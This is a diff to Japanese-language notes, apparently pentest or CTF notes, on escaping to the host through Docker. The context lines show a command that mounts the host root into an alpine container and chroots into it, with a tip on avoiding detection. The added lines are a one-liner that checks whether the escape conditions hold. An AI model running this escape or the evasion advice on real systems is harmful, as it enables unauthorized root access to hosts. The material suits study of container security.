@@ -314,6 +314,17 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 - 軽量なため alpine がよく使われるが、システムに既に存在するイメージを使用する方が検出されにくい。
 - chroot で /mnt をコンテナのルートディレクトリに変更している。
 
+ワンライナーで脆弱性があるか判定するヘルパースクリプト
+
+```sh
+docker ps >/dev/null 2>&1 \
+&& ! docker info | grep -qi rootless \
+&& ! docker info | grep -qi userns \
+&& docker info | grep -q "Storage Driver: overlay2" \
+&& echo "[+] docker escape likely possible" \
+|| echo "[-] conditions not met"
+```
+
 ホスト OS の Docker デーモンと通信する UNIX ソケットがゲスト OS から見えている場合、ホスト OS で Docker コマンドを実行するのと同じことになる。
 
 ```sh
